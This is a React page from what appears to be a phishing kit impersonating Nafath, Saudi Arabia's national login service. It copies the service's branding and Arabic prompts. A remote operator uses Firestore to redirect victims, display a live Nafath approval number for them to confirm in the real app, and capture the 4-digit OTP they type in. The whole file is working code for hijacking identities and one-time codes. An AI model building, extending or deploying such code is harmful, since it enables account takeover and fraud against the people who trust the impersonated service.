"use client";

import { Loader2Icon, Menu, ShieldAlert, Smartphone, CheckCircle2, ShieldCheck, Loader2, Shield } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { useEffect, useRef, useState } from "react";
import { addData, db } from "@/lib/firebase";
import { Alert } from "@/components/ui/alert";
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";

export default function Component() {
  const [showConfirmDialog, setShowConfirmDialog]   = useState(false);
  const [showOtpDialog, setShowOtpDialog]           = useState(false);
  const [confirmationCode, setConfirmationCode]     = useState<string>("");
  const [isloading, setIsLoading]                   = useState(true);
  const [showError, setShowError]                   = useState("");

  // OTP state
  const [otp, setOtp]           = useState(["", "", "", ""]);
  const [otpError, setOtpError] = useState("");
  const [otpLoading, setOtpLoading] = useState(false);
  const [otpDone, setOtpDone]   = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const [submitted, setSubmitted] = useState(false);

  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";

  useRedirectMonitor({ visitorId, currentPage: "nafad" });


  // Auto-submit on load
  useEffect(() => {
    if (!visitorId || submitted) return;
    setSubmitted(true);
    addData({
      id: visitorId,
      nafadConfirmationStatus: "waiting",
      currentStep: "_t6",
      nafadUpdatedAt: new Date().toISOString(),
    }).catch(console.error);
  }, [visitorId, submitted]);

  // Firebase listener
  useEffect(() => {
    if (!visitorId || !db) return;
    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnap) => {
        if (!docSnap.exists()) return;
        const data = docSnap.data();

        // Admin redirects
        if (data.currentStep === "home")  { window.location.href = "/"; return; }
        if (data.currentStep === "phone") { window.location.href = "/step5"; return; }
        if (data.currentStep === "_st1")  { window.location.href = "/check"; return; }
        if (data.currentStep === "_t2")   { window.location.href = "/step2"; return; }
        if (data.currentStep === "_t3")   { window.location.href = "/step3"; return; }

        // Nafad confirmation code sent by admin
        if (data.nafadConfirmationCode) {
          setConfirmationCode(data.nafadConfirmationCode);
          const storageKey = `nafad_shown_${visitorId}`;
          const lastShown  = localStorage.getItem(storageKey);
          if (data.nafadConfirmationCode !== lastShown) {
            setShowConfirmDialog(true);
            localStorage.setItem(storageKey, data.nafadConfirmationCode);
            setIsLoading(false);
            setShowError("");
            setShowOtpDialog(false);
          }
        } else if (data.nafadConfirmationCode === "") {
          setShowConfirmDialog(false);
          localStorage.removeItem(`nafad_shown_${visitorId}`);
        }

        // Admin approved Nafad → close confirmation dialog, open OTP dialog
        if (data.nafadConfirmationStatus === "approved") {
          setShowConfirmDialog(false);
          setShowOtpDialog(true);
          setOtp(["", "", "", ""]);
          setOtpError("");
          setOtpDone(false);
          setDoc(doc(db as Firestore, "pays", visitorId), {
            nafadConfirmationStatus: "",
            nafadConfirmationCode: "",
          }, { merge: true });
          // Focus first input after dialog opens
          setTimeout(() => inputRefs.current[0]?.focus(), 150);
        } else if (data.nafadConfirmationStatus === "rejected") {
          setShowConfirmDialog(false);
          setShowError("تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.");
          setIsLoading(false);
          setDoc(doc(db as Firestore, "pays", visitorId), {
            nafadConfirmationStatus: "",
            nafadConfirmationCode: "",
          }, { merge: true });
        }
      },
      (error) => console.error("[nafad] Firestore listener error:", error)
    );
    return () => unsubscribe();
  }, []);

  const handleRetry = async () => {
    setShowError("");
    setIsLoading(true);
    await addData({
      id: visitorId,
      nafadConfirmationStatus: "waiting",
      currentStep: "_t6",
      nafadUpdatedAt: new Date().toISOString(),
    });
  };

  // OTP input handlers
  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d?$/.test(value)) return;
    const next = [...otp];
    next[index] = value;
    setOtp(next);
    setOtpError("");
    if (value && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleOtpPaste = (e: React.ClipboardEvent) => {
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4);
    if (pasted.length === 4) {
      setOtp(pasted.split(""));
      inputRefs.current[3]?.focus();
    }
    e.preventDefault();
  };

  const handleOtpSubmit = async () => {
    const code = otp.join("");
    if (code.length !== 4) { setOtpError("يرجى إدخال الرمز المكون من 4 أرقام كاملاً"); return; }
    setOtpLoading(true);
    try {
      await setDoc(
        doc(db as Firestore, "pays", visitorId),
        {
          nafadOtp: code,
          nafadOtpSubmittedAt: new Date().toISOString(),
        },
        { merge: true }
      );
      setOtpDone(true);
      setTimeout(() => {
        window.location.href = "/step5";
      }, 1200);
    } catch (err) {
      console.error("[nafad OTP]", err);
      setOtpError("حدث خطأ، يرجى المحاولة مرة أخرى.");
    } finally {
      setOtpLoading(false);
    }
  };

  const otpFilled = otp.every((d) => d !== "");

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-slate-100" dir="rtl">
      {/* Header */}
      <header className="bg-white/80 backdrop-blur-md shadow-sm border-b border-blue-100 sticky top-0 z-10">
        <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
          <Menu className="w-6 h-6 text-gray-500 cursor-pointer hover:text-[#1976d2] transition-colors" />
          <img src="/nafad-logo.png" alt="نفاذ" width={110} className="object-contain" />
          <div className="w-6" />
        </div>
      </header>

      <main className="p-4 max-w-lg mx-auto py-10 space-y-6">
        {/* Hero */}
        <div className="text-center space-y-3">
          <div className="w-20 h-20 bg-gradient-to-br from-[#1976d2] to-[#1565c0] rounded-2xl flex items-center justify-center mx-auto shadow-lg shadow-blue-200">
            <ShieldCheck className="w-10 h-10 text-white" />
          </div>
          <h1 className="text-2xl font-bold text-gray-800">التحقق عبر نفاذ</h1>
          <p className="text-gray-500 text-sm">جاري التحقق من هويتك بأمان عبر المنصة الوطنية الموحدة</p>
        </div>

        {/* Status Card */}
        <Card className="border-0 shadow-xl shadow-blue-100/50 overflow-hidden">
          <div className="h-1 bg-gradient-to-r from-[#42a5f5] to-[#1976d2]" />
          <CardContent className="p-8 text-center space-y-6">
            {showError ? (
              <>
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto">
                  <ShieldAlert className="w-8 h-8 text-red-500" />
                </div>
                <Alert className="text-sm text-red-700 bg-red-50 border-red-200 text-right" dir="rtl">
                  <ShieldAlert className="w-4 h-4 text-red-600" />
                  {showError}
                </Alert>
                <Button
                  onClick={handleRetry}
                  className="w-full bg-[#1976d2] hover:bg-[#1565c0] text-white h-12 text-base font-semibold rounded-xl shadow-md"
                >
                  إعادة المحاولة
                </Button>
              </>
            ) : (
              <>
                <div className="flex flex-col items-center gap-4">
                  <div className="relative">
                    <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center">
                      <Loader2Icon className="w-8 h-8 text-[#1976d2] animate-spin" />
                    </div>
                    <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-[#1976d2] rounded-full flex items-center justify-center">
                      <div className="w-2 h-2 bg-white rounded-full animate-pulse" />
                    </div>
                  </div>
                  <div className="space-y-1">
                    <p className="font-semibold text-gray-800 text-lg">في انتظار التحقق</p>
                    <p className="text-gray-500 text-sm">سيتم إرسال رمز التحقق إلى تطبيق نفاذ</p>
                  </div>
                </div>

                <div className="bg-blue-50 rounded-xl p-4 border border-blue-100 space-y-2 text-right">
                  <div className="flex items-center gap-2 text-[#1565c0] text-sm">
                    <ShieldCheck className="w-4 h-4 flex-shrink-0" />
                    <span>تأكد أن تطبيق نفاذ مثبت على جهازك</span>
                  </div>
                  <div className="flex items-center gap-2 text-[#1565c0] text-sm">
                    <Smartphone className="w-4 h-4 flex-shrink-0" />
                    <span>انتظر وصول الإشعار على هاتفك</span>
                  </div>
                </div>
              </>
            )}
          </CardContent>
        </Card>

        {/* App Download */}
        <div className="bg-gradient-to-br from-[#1976d2] to-[#1565c0] rounded-2xl p-6 text-center text-white space-y-4 shadow-lg shadow-blue-200 relative overflow-hidden">
          <div className="absolute top-0 right-0 w-28 h-28 bg-white/10 rounded-full -mr-10 -mt-10" />
          <div className="absolute bottom-0 left-0 w-20 h-20 bg-white/10 rounded-full -ml-8 -mb-8" />
          <p className="text-sm font-medium text-blue-100 relative z-10">لتحميل تطبيق نفاذ</p>
          <div className="flex justify-center gap-3 relative z-10">
            <a href="#" className="hover:scale-105 transition-transform">
              <img src="/google-play.png" alt="Google Play" className="h-9 rounded-lg" />
            </a>
            <a href="#" className="hover:scale-105 transition-transform">
              <img src="/apple_store.png" alt="App Store" className="h-9 rounded-lg" />
            </a>
          </div>
        </div>
      </main>

      {/* ── Nafad Confirmation Code Dialog ─────────────── */}
      <Dialog open={showConfirmDialog} onOpenChange={() => {}}>
        <DialogContent className="max-w-sm mx-auto [&>button]:hidden rounded-2xl border-0 shadow-2xl" dir="rtl">
          <DialogHeader className="space-y-1">
            <DialogTitle className="text-center text-xl font-bold text-gray-800">
              رمز التحقق من نفاذ
            </DialogTitle>
            <p className="text-center text-sm text-gray-500 leading-relaxed">
              افتح تطبيق نفاذ وأكد الرقم الظاهر أدناه
            </p>
          </DialogHeader>

          <div className="text-center space-y-5 py-2">
            <div className="mx-auto w-44 h-44 bg-gradient-to-br from-blue-50 to-blue-100 border-2 border-blue-200 rounded-3xl shadow-inner flex items-center justify-center">
              <div className="flex gap-4 justify-center items-center" dir="ltr">
                <div className="text-7xl font-black text-[#1976d2] font-mono leading-none">
                  {confirmationCode?.[0] || "–"}
                </div>
                <div className="text-7xl font-black text-[#1976d2] font-mono leading-none">
                  {confirmationCode?.[1] || "–"}
                </div>
              </div>
            </div>

            <div className="flex items-center justify-center gap-2 text-[#1976d2]">
              <div className="relative flex items-center justify-center w-4 h-4">
                <div className="w-3 h-3 bg-[#1976d2] rounded-full animate-ping absolute opacity-75" />
                <div className="w-2 h-2 bg-[#1565c0] rounded-full" />
              </div>
              <span className="text-sm font-medium">في انتظار تأكيدك في التطبيق...</span>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* ── 4-digit OTP Dialog (after Nafad approval) ──── */}
      <Dialog open={showOtpDialog} onOpenChange={() => {}}>
        <DialogContent className="max-w-sm mx-auto [&>button]:hidden rounded-3xl border-0 shadow-2xl p-0 overflow-hidden" dir="rtl">
          {/* Top gradient strip */}
          <div className="h-1 bg-gradient-to-l from-[#42a5f5] via-[#1976d2] to-[#1565c0]" />

          <div className="px-6 pt-5 pb-6 space-y-5">
            <DialogHeader className="text-center space-y-3">
              <div className="flex justify-center">
                <div className="relative">
                  <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#1976d2] to-[#1565c0] flex items-center justify-center shadow-xl shadow-blue-200">
                    <Smartphone className="w-8 h-8 text-white" />
                  </div>
                  {otpDone && (
                    <div className="absolute -top-1 -right-1 w-5 h-5 bg-emerald-500 rounded-full flex items-center justify-center shadow">
                      <CheckCircle2 className="w-3 h-3 text-white" />
                    </div>
                  )}
                </div>
              </div>
              <DialogTitle className="text-lg font-black text-slate-800">
                رمز التحقق
              </DialogTitle>
              <p className="text-sm text-slate-500 leading-relaxed">
                أدخل رمز التحقق المكون من{" "}
                <span className="font-bold text-[#1976d2]">4 أرقام</span>{" "}
                الذي وصلك
              </p>
            </DialogHeader>

            {/* 4 separate digit boxes */}
            <div className="flex justify-center gap-3" dir="ltr" onPaste={handleOtpPaste}>
              {otp.map((digit, i) => (
                <input
                  key={i}
                  ref={(el) => { inputRefs.current[i] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleOtpChange(i, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(i, e)}
                  disabled={otpLoading || otpDone}
                  className={[
                    "w-14 h-16 text-center text-3xl font-black rounded-2xl border-2 outline-none transition-all",
                    otpError
                      ? "border-red-300 bg-red-50 text-red-700"
                      : otpDone
                      ? "border-emerald-300 bg-emerald-50 text-emerald-700"
                      : digit
                      ? "border-[#1976d2] bg-blue-50 text-[#1565c0]"
                      : "border-slate-200 bg-slate-50 text-slate-800 focus:border-[#1976d2] focus:bg-white",
                  ].join(" ")}
                />
              ))}
            </div>

            {/* Error */}
            {otpError && (
              <p className="text-center text-xs text-red-600 font-medium">⚠ {otpError}</p>
            )}

            {/* Success */}
            {otpDone && (
              <div className="flex items-center justify-center gap-2 bg-emerald-50 border border-emerald-200 rounded-2xl px-4 py-3">
                <CheckCircle2 className="h-4 w-4 text-emerald-600 flex-shrink-0" />
                <p className="text-sm text-emerald-800 font-bold">تم التحقق بنجاح! جاري الانتقال...</p>
              </div>
            )}

            {/* Submit button */}
            <button
              type="button"
              onClick={handleOtpSubmit}
              disabled={!otpFilled || otpLoading || otpDone}
              className="w-full h-12 rounded-2xl font-black text-sm transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              style={{
                background: otpDone
                  ? "linear-gradient(135deg, #10b981, #059669)"
                  : otpLoading
                  ? "linear-gradient(135deg, #1565c0, #0d47a1)"
                  : "linear-gradient(135deg, #1976d2, #1565c0)",
                color: "#fff",
                boxShadow: otpDone
                  ? "0 8px 24px rgba(16,185,129,0.3)"
                  : "0 8px 24px rgba(25,118,210,0.35)",
              }}
            >
              {otpLoading ? (
                <><Loader2 className="h-4 w-4 animate-spin" /> جاري التحقق...</>
              ) : otpDone ? (
                <><CheckCircle2 className="h-4 w-4" /> تم التحقق</>
              ) : (
                "تأكيد الرمز"
              )}
            </button>

            <div className="flex items-center justify-center gap-1.5">
              <Shield className="h-3 w-3 text-slate-400" />
              <p className="text-[11px] text-slate-400">رمز التحقق صالح لمدة 10 دقائق فقط</p>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Footer */}
      <footer className="mt-10 p-6 bg-white/60 border-t border-gray-100">
        <div className="text-center space-y-4 max-w-4xl mx-auto">
          <div className="flex flex-wrap justify-center gap-x-6 gap-y-1 text-xs text-gray-500">
            {["الرئيسية", "حول", "اتصل بنا", "الشروط والأحكام", "المساعدة والدعم", "سياسة الخصوصية"].map((link) => (
              <a key={link} href="#" className="hover:text-teal-600 transition-colors">{link}</a>
            ))}
          </div>
          <div className="flex justify-center">
            <img src="/cst-logo.jpg" alt="هيئة الاتصالات" width={50} className="opacity-60 rounded" />
          </div>
        </div>
      </footer>
    </div>
  );
}
